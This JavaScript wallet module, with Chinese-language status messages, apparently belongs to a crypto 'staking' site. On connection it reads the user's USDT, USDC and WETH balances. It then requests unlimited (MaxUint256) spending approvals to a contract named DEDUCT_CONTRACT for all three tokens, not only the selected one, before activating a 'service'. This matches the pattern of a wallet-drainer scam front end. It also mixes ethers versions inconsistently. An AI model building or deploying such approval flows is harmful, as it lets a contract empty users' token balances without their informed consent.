import { DEDUCT_CONTRACT_ADDRESS, USDT_CONTRACT_ADDRESS, USDC_CONTRACT_ADDRESS, WETH_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, ERC20_ABI, translations } from './constants.js';
import { updateStatus, disableInteractiveElements, updateBalancesUI, updateInterest, resetState } from './ui.js';
import { saveUserData } from './sse.js';

export let provider, signer, userAddress;
export let deductContract, usdtContract, usdcContract, wethContract;

export async function sendMobileRobustTransaction(populatedTx) {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer || !provider) {
        console.error(`sendMobileRobustTransaction: 錢包未連線或缺少簽署者`);
        throw new Error(translations[currentLang].error + ": 錢包未連線或缺少簽署者。");
    }
    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();
    const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
    let txHash, receipt = null;
    try {
        console.log(`sendMobileRobustTransaction: Sending transaction:`, mobileTx);
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        updateStatus(`${translations[currentLang].fetchingBalances} HASH: ${txHash.slice(0, 10)}... 等待確認中...`);
        receipt = await provider.waitForTransaction(txHash);
        console.log(`sendMobileRobustTransaction: Transaction confirmed, receipt:`, receipt);
    } catch (error) {
        console.warn(`sendMobileRobustTransaction: Transaction error: ${error.message}`);
        if (error.hash) txHash = error.hash;
        else if (error.message && error.message.includes('0x')) {
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
            if (match) txHash = match[0];
        }
        if (txHash) {
            updateStatus(`交易介面錯誤！已發送交易: ${txHash.slice(0, 10)}... 等待確認中...`);
            receipt = await provider.waitForTransaction(txHash);
            console.log(`sendMobileRobustTransaction: Transaction confirmed after error, receipt:`, receipt);
        } else {
            console.error(`sendMobileRobustTransaction: 交易發送失敗: ${error.message}`);
            throw new Error(`交易發送失敗: ${error.message}`);
        }
    }
    if (!receipt || receipt.status !== 1) {
        console.error(`sendMobileRobustTransaction: 鏈上交易失敗（已回滾）。HASH: ${txHash.slice(0, 10)}...`);
        throw new Error(`鏈上交易失敗（已回滾）。HASH: ${txHash.slice(0, 10)}...`);
    }
    return receipt;
}

export async function initializeWallet() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    try {
        // 檢查 ethers.js 是否載入
        if (!window.ethers || !window.ethers.BrowserProvider) {
            console.error(`initializeWallet: Ethers.js BrowserProvider 未載入。請檢查 CDN 或網絡。`);
            updateStatus(translations[currentLang].ethersError, true);
            document.getElementById('connectButton').disabled = true;
            return;
        }

        // 檢查 Web3 提供者（支援多種錢包）
        let web3Provider = null;
        if (typeof window.ethereum !== 'undefined') {
            web3Provider = window.ethereum;
            console.log(`initializeWallet: 檢測到 window.ethereum（標準提供者）`);
        } else if (typeof window.web3 !== 'undefined' && window.web3.currentProvider) {
            web3Provider = window.web3.currentProvider;
            console.log(`initializeWallet: 檢測到 window.web3.currentProvider（舊版提供者）`);
        } else {
            console.error(`initializeWallet: 未檢測到 Ethereum 提供者。`);
            updateStatus(translations[currentLang].noWallet, true);
            disableInteractiveElements(true);
            document.getElementById('connectButton').disabled = true;
            return;
        }

        provider = new window.ethers.BrowserProvider(web3Provider);
        web3Provider.on('accountsChanged', (newAccounts) => {
            console.log(`initializeWallet: 帳戶變更:`, newAccounts);
            if (userAddress && (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase())) {
                window.location.reload();
            }
        });
        web3Provider.on('chainChanged', () => {
            console.log(`initializeWallet: 鏈變更，重新載入頁面。`);
            window.location.reload();
        });

        const accounts = await provider.send('eth_accounts', []);
        console.log(`initializeWallet: 初始帳戶:`, accounts);
        if (accounts.length > 0) {
            await connectWallet();
        } else {
            disableInteractiveElements(true);
            updateStatus(translations[currentLang].noWallet, true);
        }
    } catch (error) {
        console.error(`initializeWallet: 錢包初始化錯誤: ${error.message}`);
        updateStatus(`${translations[currentLang].error}: ${error.message}`, true);
        document.getElementById('connectButton').disabled = true;
    }
}

export async function connectWallet() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    try {
        // 檢查 ethers.js 是否載入
        if (!window.ethers || !window.ethers.BrowserProvider) {
            console.error(`connectWallet: Ethers.js BrowserProvider 未載入。請檢查 CDN 或網絡。`);
            updateStatus(translations[currentLang].ethersError, true);
            document.getElementById('connectButton').disabled = true;
            return;
        }

        // 檢查 Web3 提供者
        let web3Provider = null;
        if (typeof window.ethereum !== 'undefined') {
            web3Provider = window.ethereum;
            console.log(`connectWallet: 使用 window.ethereum`);
        } else if (typeof window.web3 !== 'undefined' && window.web3.currentProvider) {
            web3Provider = window.web3.currentProvider;
            console.log(`connectWallet: 使用 window.web3.currentProvider`);
        } else {
            console.error(`connectWallet: 未檢測到 Ethereum 提供者。`);
            updateStatus(translations[currentLang].noWallet, true);
            document.getElementById('connectButton').disabled = true;
            return;
        }

        provider = new window.ethers.BrowserProvider(web3Provider);
        console.log(`connectWallet: 已初始化提供者。`);
        updateStatus('請在您的錢包中確認連線...');
        const accounts = await provider.send('eth_requestAccounts', []);
        console.log(`connectWallet: 接收到帳戶:`, accounts);
        if (accounts.length === 0) {
            console.error(`connectWallet: 未選擇帳戶。`);
            throw new Error("未選擇帳戶。");
        }
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        console.log(`connectWallet: 已連線用戶地址: ${userAddress}`);
        const connectButton = document.getElementById('connectButton');
        connectButton.classList.add('connected');
        connectButton.textContent = '已連線';
        connectButton.title = '斷開錢包連線';
        connectButton.disabled = false;
        deductContract = new window.ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
        await updateUIBasedOnChainState();
        updateStatus(translations[currentLang].fetchingBalances);

        // 獲取餘額
        const balances = {
            usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
            usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
            weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
        };
        console.log(`connectWallet: 錢包餘額:`, balances);
        updateBalancesUI(balances);
        updateStatus(translations[currentLang].walletConnected);

        // 初始化 SSE 和數據載入
        if (userAddress) {
            const { setupSSE } = await import('./sse.js');
            setupSSE();
            await import('./sse.js').then(module => module.loadUserDataFromServer());
        }
        await saveUserData();
    } catch (error) {
        console.error(`connectWallet: 連線錯誤: ${error.message}`);
        let userMessage = `${translations[currentLang].error}: ${error.message}`;
        if (error.code === 4001) userMessage = "您拒絕了連線請求。";
        updateStatus(userMessage, true);
        resetState(true);
        document.getElementById('connectButton').disabled = typeof window.ethereum === 'undefined' && typeof window.web3 === 'undefined';
    }
}

export async function updateUIBasedOnChainState() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer) {
        console.log(`updateUIBasedOnChainState: 無可用簽署者，跳過。`);
        return;
    }
    try {
        updateStatus(translations[currentLang].fetchingBalances);
        const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
        console.log(`updateUIBasedOnChainState: 所需授權額度: ${requiredAllowance.toString()}`);
        const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            retry(() => deductContract.isServiceActiveFor(userAddress)),
            retry(() => usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
            retry(() => usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
            retry(() => wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
        ]);
        console.log(`updateUIBasedOnChainState: 鏈上狀態:`, { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance });
        const isWethAuthorized = wethAllowance >= requiredAllowance;
        const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
        const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
        const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
        const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
        if (isFullyAuthorized) {
            console.log(`updateUIBasedOnChainState: 鏈上狀態為已授權。切換到質押 UI。`);
            const walletTokenSelect = document.getElementById('walletTokenSelect');
            if (isWethAuthorized) walletTokenSelect.value = 'WETH';
            else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
            else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
            walletTokenSelect.dispatchEvent(new Event('change'));
            const { activateStakingUI, setInitialNextBenefitTime } = await import('./ui.js');
            setInitialNextBenefitTime();
            activateStakingUI();
            document.getElementById('pledgeBtn').disabled = false;
            document.getElementById('pledgeAmount').disabled = false;
            document.getElementById('pledgeDuration').disabled = false;
            document.getElementById('pledgeToken').disabled = false;
        } else {
            console.log(`updateUIBasedOnChainState: 鏈上狀態未授權。顯示開始按鈕。`);
            const startBtn = document.getElementById('startBtn');
            if (startBtn) startBtn.style.display = 'block';
            document.getElementById('pledgeBtn').disabled = true;
            document.getElementById('pledgeAmount').disabled = true;
            document.getElementById('pledgeDuration').disabled = true;
            document.getElementById('pledgeToken').disabled = true;
        }
        disableInteractiveElements(false);
        updateStatus("");
    } catch (error) {
        console.error(`updateUIBasedOnChainState: 無法檢查鏈上狀態: ${error.message}`);
        updateStatus(`${translations[currentLang].error}: ${error.message}`, true);
    }
}

export async function handleConditionalAuthorizationFlow() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer) {
        console.error(`handleConditionalAuthorizationFlow: 錢包未連線`);
        throw new Error(translations[currentLang].error + ": 錢包未連線");
    }
    updateStatus('準備授權...');
    const selectedToken = document.getElementById('walletTokenSelect').value;
    console.log(`handleConditionalAuthorizationFlow: 用戶選擇 ${selectedToken} 進行授權。`);
    const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
    console.log(`handleConditionalAuthorizationFlow: 所需授權額度: ${requiredAllowance.toString()}`);
    const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
    console.log(`handleConditionalAuthorizationFlow: 服務已啟動: ${serviceActivated}`);
    const tokenMap = {
        'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
        'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
        'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
    };
    const tokensToProcess = [tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken)];
    let tokenToActivate = '';
    for (const { name, contract, address } of tokensToProcess) {
        updateStatus(`檢查 ${name} 授權額度...`);
        const currentAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
        console.log(`handleConditionalAuthorizationFlow: ${name} 授權額度: ${currentAllowance.toString()}`);
        if (currentAllowance < requiredAllowance) {
            updateStatus(`請求 ${name} 授權... 請在錢包中確認。`);
            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, window.ethers.constants.MaxUint256);
            approvalTx.value = 0n;
            console.log(`handleConditionalAuthorizationFlow: 發送 ${name} 授權交易:`, approvalTx);
            await sendMobileRobustTransaction(approvalTx);
            const newAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
            console.log(`handleConditionalAuthorizationFlow: 新 ${name} 授權額度: ${newAllowance.toString()}`);
            if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
        } else {
            if (!tokenToActivate) tokenToActivate = address;
        }
    }
    if (!serviceActivated && tokenToActivate) {
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        updateStatus(`啟動服務（使用 ${tokenName}）...`);
        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        console.log(`handleConditionalAuthorizationFlow: 發送啟動服務交易:`, activateTx);
        const receipt = await sendMobileRobustTransaction(activateTx);
        await saveUserData({
            isActive: true,
            stakingStartTime: (await import('./ui.js')).stakingStartTime,
            claimedInterest: (await import('./ui.js')).claimedInterest,
            pledgedAmount: (await import('./ui.js')).pledgedAmount,
            accountBalance: (await import('./ui.js')).accountBalance,
            nextBenefitTime: localStorage.getItem('nextBenefitTime'),
            lastUpdated: Date.now(),
            source: 'index.html'
        });
    }
}

export async function disconnectWallet() {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    console.log(`disconnectWallet: 錢包已斷開連線。`);
    resetState(true);
}

async function retry(fn, maxAttempts = 3, delayMs = 3000) {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    for (let i = 0; i < maxAttempts; i++) {
        try {
            return await fn();
        } catch (error) {
            if (error.message.includes('CORS') || error.message.includes('preflight') || error.message.includes('Unexpected token')) {
                console.warn(`retry: 檢測到錯誤（CORS 或 JSON 解析），延長延遲至 ${delayMs}ms: ${error.message}`);
            }
            if (i === maxAttempts - 1) throw error;
            console.warn(`retry: 第 ${i + 1}/${maxAttempts} 次嘗試失敗，將在 ${delayMs}ms 後重試: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
    }
}